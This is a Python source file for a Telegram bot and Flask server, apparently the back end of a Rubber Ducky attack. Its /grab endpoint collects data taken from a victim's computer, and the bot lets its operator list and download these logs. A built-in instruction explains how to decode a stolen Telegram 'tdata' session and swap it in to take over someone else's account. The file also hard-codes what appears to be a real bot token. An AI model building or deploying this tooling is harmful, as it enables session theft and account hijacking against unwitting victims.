import telebot
from telebot import types
import json
import os
from datetime import datetime
import threading
from flask import Flask, request, jsonify

# ============================================================
# ТОКЕН БОТА
# ============================================================
TOKEN = "8901567796:AAFPXou6PCvysgXnv2jcf-7yrNAvXNIaDJY"
bot = telebot.TeleBot(TOKEN)

# ============================================================
# ПАПКА ДЛЯ ЛОГОВ
# ============================================================
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# ============================================================
# КЛАВИАТУРА
# ============================================================
def main_keyboard():
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton("📊 Логи")
    btn2 = types.KeyboardButton("📥 Скачать")
    btn3 = types.KeyboardButton("📖 Инструкция")
    btn4 = types.KeyboardButton("🧹 Очистить")
    keyboard.add(btn1, btn2, btn3)
    keyboard.add(btn4)
    return keyboard

# ============================================================
# КОМАНДА /start
# ============================================================
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "🪐 **DUCKY BOT**\n\n"
        "Принимаю данные от Rubber Ducky.\n"
        "Отправляй POST на `/grab`\n\n"
        "Выбери действие:",
        parse_mode='Markdown',
        reply_markup=main_keyboard()
    )

# ============================================================
# КНОПКА "📊 Логи"
# ============================================================
@bot.message_handler(func=lambda m: m.text == "📊 Логи")
def logs(m):
    files = get_files()
    if not files:
        bot.send_message(m.chat.id, "Нет логов")
        return
    text = "📊 **Логи:**\n"
    for f in files[:10]:
        text += f"`{f}`\n"
    bot.send_message(m.chat.id, text, parse_mode='Markdown')

# ============================================================
# КНОПКА "📥 Скачать"
# ============================================================
@bot.message_handler(func=lambda m: m.text == "📥 Скачать")
def download(m):
    files = get_files()
    if not files:
        bot.send_message(m.chat.id, "Нет файлов")
        return
    path = os.path.join(LOG_DIR, files[0])
    with open(path, 'rb') as f:
        bot.send_document(m.chat.id, f, caption=files[0])

# ============================================================
# КНОПКА "📖 Инструкция"
# ============================================================
@bot.message_handler(func=lambda m: m.text == "📖 Инструкция")
def instruction(m):
    text = """
📖 **КАК ПОЛУЧИТЬ TELEGRAM СЕССИЮ**

1. Вставь Rubber Ducky в ПК жертвы
2. Данные придут сюда
3. Найди поле `telegram` — это Base64
4. Декодируй:
   `echo "строка" | base64 -d > tg.zip`
5. Распакуй архив
6. Замени папку `%AppData%\\Telegram Desktop\\tdata`
7. Запусти Telegram — ты в чужом аккаунте
"""
    bot.send_message(m.chat.id, text)

# ============================================================
# КНОПКА "🧹 Очистить"
# ============================================================
@bot.message_handler(func=lambda m: m.text == "🧹 Очистить")
def clear(m):
    for f in os.listdir(LOG_DIR):
        os.remove(os.path.join(LOG_DIR, f))
    bot.send_message(m.chat.id, "✅ Очищено")

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ
# ============================================================
def get_files():
    return sorted([f for f in os.listdir(LOG_DIR) if f.endswith('.json')], reverse=True)

# ============================================================
# FLASK СЕРВЕР
# ============================================================
app = Flask(__name__)

@app.route('/')
def index():
    return "✅ Ducky Bot is running"

@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data"}), 400

        name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        path = os.path.join(LOG_DIR, name)

        with open(path, 'w') as f:
            json.dump(data, f, indent=2)

        print(f"[+] Saved: {name}")
        return jsonify({"status": "OK", "file": name}), 200

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"error": str(e)}), 500

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    def run_bot():
        bot.polling(none_stop=True)

    t = threading.Thread(target=run_bot)
    t.daemon = True
    t.start()

    app.run(host='0.0.0.0', port=10000)
